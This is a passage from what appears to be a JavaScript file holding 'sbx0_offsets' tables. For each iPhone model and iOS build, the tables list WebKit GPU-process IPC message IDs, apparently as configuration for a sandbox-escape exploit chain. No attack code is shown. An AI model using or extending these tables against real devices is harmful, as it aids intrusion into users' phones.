      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone17,5_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   }
};

  sbx0_offsets = {
   "iPhone11,2_4_6_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone11,8_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone12,1_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone12,3_5_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone12,8_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone13,1_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone13,2_3_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone13,4_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone14,2_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone14,3_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone14,4_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
